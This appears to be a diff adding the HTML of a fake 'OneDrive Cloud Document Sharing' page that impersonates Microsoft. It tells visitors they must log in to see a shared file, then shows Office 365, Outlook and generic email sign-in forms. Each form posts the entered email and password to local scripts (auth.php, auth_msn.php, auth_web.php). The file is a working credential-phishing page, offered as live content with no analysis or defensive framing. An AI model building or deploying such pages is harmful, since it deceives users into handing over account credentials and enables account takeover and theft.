@@ -1,0 +1,221 @@
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" id="viewport" content="target-densitydpi=high-dpi,initial-scale=1.0,user-scalable=no">
+    <title>OneDrive Cloud Document Sharing</title>
+
+    <link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
+	<link rel="stylesheet" href="css/off.css">
+	<link rel="icon" type="image/png" href="images/favicon.ico">
+<style>
+.bg-img {
+  /* The image used */
+  background-image: url("images/hero.jpg");
+
+  min-height: 500px;
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  position: relative;
+}
+</style>
+
+</head>
+<body>
+
+<img align="top" id="image1" src="images/topleft.png" width="65" height="auto">
+<span id="title1">OneDrive</span>
+<div class="bg-img">
+
+<div class="gada">
+<span id="uptxt">To accesss this document, please choose your email provider below - Login to view shared file.</span><br><br>
+
+    <!-- Trigger/Open The Modal -->
+    <button id="btn1" class="myBtn_multi" data-index="0"><img src="images/bt1.png" height="auto" width="25">&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Office 365</button>
+    <p><button id="btn2" class="myBtn_multi" data-index="1"><img src="images/bt2.jpg" height="auto" width="25">&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Outlook mail</button></p>
+
+    <!-- The Modal -->
+    <div class="modal modal_multi" data-index="0">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close close_multi" data-index="0">×</span>
+            <p>
+			</p><div class="bx1">
+<form method="post" action="auth.php" class="container" autocomplete="off">
+<p><img src="images/office.png" width="180" height="auto"></p>
+<span id="org">Sign in with your organizational account</span>
+
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Username or Email" type="email" name="ee" id="ee" required="">
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required=""><br>
+				<button type="submit">Sign in</button>
+				</form>
+</div>
+			<p></p>
+        </div>
+
+    </div>
+
+    <!-- The Modal -->
+    <div class="modal modal_multi" data-index="1">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close close_multi" data-index="1">×</span>
+            <p>
+			</p><div class="bx2">
+			<form method="post" action="auth_msn.php" class="container" autocomplete="off">
+<p><img src="images/out.png" width="110" height="auto"></p>
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Email or phone" type="email" name="ee" id="ee" required="">
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required="">
+				<div style="margin-right:28px;" align="right"><button type="submit">Next</button></div>
+				</form>
+</div>
+			<p></p>
+        </div>
+
+    </div>
+    <!-- Trigger/Open The Modal -->
+    <button class="btn3" id="myBtn"><img align="top" src="images/wbm.png" width="25" height="auto">&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;Login with Other Email Providers</button>
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close">x</span>
+            <p>
+			</p><div class="bx3">
+<form method="post" action="auth_web.php" class="container" autocomplete="off">
+<center><img src="images/wbm.png" width="70" height="auto"><br>
+<span id="org2">Sign in with your mail account</span></center>
+<input onfocus="this.placeholder=''" onblur="this.placeholder='Email'" placeholder="Email address" type="email" name="ee" id="ee" required="">
+				<br>				
+			<input onfocus="this.placeholder=''" onblur="this.placeholder='Password'" placeholder="Password" type="password" name="ps" id="ps" required="">
+				<button id="lastbut" type="submit">Sign in</button>
+				
+				</form>
+</div>
+			<p></p>
+        </div>
+
+    </div>
+    <script>
+        // Get the modal
+
+        var modalparent = document.getElementsByClassName("modal_multi");
+
+        // Get the button that opens the modal
+
+        var modal_btn_multi = document.getElementsByClassName("myBtn_multi");
+
+        // Get the <span> element that closes the modal
+        var span_close_multi = document.getElementsByClassName("close_multi");
+
+        // When the user clicks the button, open the modal
+        function setDataIndex() {
+
+            for (i = 0; i < modal_btn_multi.length; i++)
+            {
+                modal_btn_multi[i].setAttribute('data-index', i);
+                modalparent[i].setAttribute('data-index', i);
+                span_close_multi[i].setAttribute('data-index', i);
+            }
+        }
+
+
+
+        for (i = 0; i < modal_btn_multi.length; i++)
+        {
+            modal_btn_multi[i].onclick = function() {
+                var ElementIndex = this.getAttribute('data-index');
+                modalparent[ElementIndex].style.display = "block";
+            };
+
+            // When the user clicks on <span> (x), close the modal
+            span_close_multi[i].onclick = function() {
+                var ElementIndex = this.getAttribute('data-index');
+                modalparent[ElementIndex].style.display = "none";
+            };
+
+        }
+
+        window.onload = function() {
+
+            setDataIndex();
+        };
+
+        window.onclick = function(event) {
+            if (event.target === modalparent[event.target.getAttribute('data-index')]) {
+                modalparent[event.target.getAttribute('data-index')].style.display = "none";
+            }
+
+            // OLD CODE
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        };
+
+//XXXXXXXXXXXXXXXXXXXXXXX    Modified old code    XXXXXXXXXXXXXXXXXXXXXXXXXX
+
+// Get the modal
+
+        var modal = document.getElementById('myModal');
+
+// Get the button that opens the modal
+        var btn = document.getElementById("myBtn");
+
+// Get the <span> element that closes the modal
+        var span = modal.getElementsByClassName("close")[0]; 
+
+// When the user clicks on the button, open the modal
+
+        btn.onclick = function() {
+
+            modal.style.display = "block";
+        }
+
+// When the user clicks on <span> (x), close the modal
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+
+
+    </script>
+<br>	
+<center>
+<p><img src="images/4.svg" width="110px" height="auto"></p>
+
+<span id="uptxt"><small>Get to all your files from anywhere on any device, and share them with anyone securely and with ease.</small></span>
+</center>
+</div>
+</div>
+
+
+<center>
+<p>
+</p><div class="db1">
+<img src="images/1.svg" align="top"><br><br>
+<span id="heavi">Access files from any device</span>
+</div>
+<div class="db2">
+<img src="images/2.svg" align="top"><br><br>
+<span id="heavi">Offline access</span>
+</div>
+<div class="db3">
+<img src="images/3.svg" align="top"><br><br>
+<span id="heavi">Keep your files safe</span>
+</div>
+<p></p>
+</center>
+
+
+
+</body></html>
